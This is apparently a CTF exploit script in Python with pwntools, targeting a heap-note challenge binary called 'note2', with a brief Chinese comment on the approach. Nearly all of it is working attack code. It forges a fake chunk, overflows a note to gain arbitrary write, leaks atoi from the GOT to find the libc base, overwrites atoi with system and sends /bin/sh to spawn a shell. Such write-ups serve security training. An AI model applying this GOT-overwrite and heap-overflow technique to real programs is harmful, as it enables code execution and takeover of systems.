#coding:utf-8
'''
好诡异，为什么free以后都入smallbin了？？？？
所以思路不能用fastbin attack ， unlink也不行，堆溢出走不通
所以
溢出temp_malloc进行将chunk定位到heap_list和heap_size_list上
leak libc，然后改atoi为system，再发送/bin/sh就可以getshell
'''
from pwn import *
e=ELF("/lib/x86_64-linux-gnu/libc.so.6")
atoi_off=e.symbols["atoi"]
system_off=e.symbols["system"]
p=process("./note2")
def init(name,address):
    p.sendlineafter("name:",name)
    p.sendlineafter("address",address)

def add(length,content):
    p.sendlineafter("-->>","1")
    p.sendlineafter("length of the note content:",str(length))
    p.sendlineafter("Input the note content:",content)

def show(idx):
    p.sendlineafter("-->>","2")
    p.sendlineafter("Input the id of the note:",idx)
def overwrite(idx,content):
    p.sendlineafter("-->>","3")
    p.sendlineafter("Input the id of the note:",str(idx))
    p.sendlineafter("[1.overwrite/2.append]","1")
    p.sendlineafter("TheNewContents:",content)
def append(idx,content):
    p.sendlineafter("-->>","3")
    p.sendlineafter("Input the id of the note:",str(idx))
    p.sendlineafter("[1.overwrite/2.append]","2")
    p.sendlineafter("TheNewContents:",content)
def dlt(idx):
    p.sendlineafter("-->>","4")
    p.sendlineafter("Input the id of the note:",str(idx))
    print "dlt done ..."

name="A"*32+p64(0)+p64(0x81)+"bbbbbS"
address=p64(0)+p64(0x11)+"\00"*0x10#+p64(0x11)#fastbin并不会发生合并，所以后面的inuse不重要
init(name,address)
add(12,"AAAA")#p64(0xdeadbeef)
add(0,"bbbb")
add(12,"CCCC")
# add(12,"DDDD")
# dlt(2)
#
# gdb.attach(p,'''
#     b *0x0400F1C
#     b *0x00400F45
#     x /32gx 0x6020E0
# ''')
fakechunk=0x6020e0+32+16
pay1="u"*128+p64(fakechunk)
overwrite(1,pay1)
print "lets malloc now ..."
atoi_got=0x0602088
pay=p64(0xdeadbeef)*2+p64(atoi_got)
add(120,pay)
p.sendlineafter("-->>","2")
p.sendlineafter("Input the id of the note:","0")
p.recvuntil("Content is ")
addr=p.recvuntil("\n")[:-1]
addr=u64(addr.ljust(8,"\00"))
atoi=addr
log.success("atoi: "+hex(atoi))
base=atoi-atoi_off
log.success("base: "+hex(base))
system=system_off+base
log.success("system: "+hex(system))
overwrite(0,p64(system))
p.sendlineafter("-->>","/bin/sh")
p.interactive()
